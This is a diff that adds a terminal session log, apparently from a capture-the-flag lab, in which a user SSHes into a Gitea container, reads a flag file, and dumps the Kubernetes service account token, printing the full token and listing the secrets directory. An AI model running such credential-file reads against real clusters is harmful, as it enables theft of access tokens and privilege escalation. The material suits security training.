@@ -1,0 +1,31 @@
+Script started on 2026-10-02 17:55:02+03:00 [COMMAND="ssh git@palsforlife.thm -p 31112 -i git.key" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="119" LINES="29"]
+The authenticity of host '[palsforlife.thm]:31112 ([10.80.184.129]:31112)' can't be established.
+ED25519 key fingerprint is: SHA256:tNVQ6AzrsX4CsacW/hqRvTWPYOJt3b94J86BGAffnYY
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[palsforlife.thm]:31112' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+gitea-0:~$ cat /root/flag2.txt
+flag{_G0ddamit_Leeroy_}gitea-0:~$ ls
+[1;34mrepositories[0m
+gitea-0:~$ cat /run/secrets/kubernetes.io/serviceaccount/token
+eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9wgitea-0:~$ 
+gitea-0:~$ cd /var/run/secrets/kubernetes.io/serviceaccount
+gitea-0:/var/run/secrets/kubernetes.io/serviceaccount$ ls
+[1;36mca.crt[0m     [1;36mnamespace[0m  [1;36mtoken[0m
+gitea-0:/var/run/secrets/kubernetes.io/serviceaccount$ ls -al
+total 4
+drwxrwxrwt    3 root     root           140 Oct  2 14:01 [1;34m.[0m
+drwxr-xr-x    3 root     root          4096 Oct  2 14:01 [1;34m..[0m
+drwxr-xr-x    2 root     root           100 Oct  2 14:01 [1;34m..2026_10_02_14_01_42.219226217[0m
+lrwxrwxrwx    1 root     root            31 Oct  2 14:01 [1;36m..data[0m -> [1;34m..2026_10_02_14_01_42.219226217[0m
+lrwxrwxrwx    1 root     root            13 Oct  2 14:01 [1;36mca.crt[0m -> [0;0m..data/ca.crt[0m
+lrwxrwxrwx    1 root     root            16 Oct  2 14:01 [1;36mnamespace[0m -> [0;0m..data/namespace[0m
+lrwxrwxrwx    1 root     root            12 Oct  2 14:01 [1;36mtoken[0m -> [0;0m..data/token[0m
+gitea-0:/var/run/secrets/kubernetes.io/serviceaccount$ exit
+logout
+Connection to palsforlife.thm closed.
+
+Script done on 2026-10-02 18:14:58+03:00 [COMMAND_EXIT_CODE="0"]
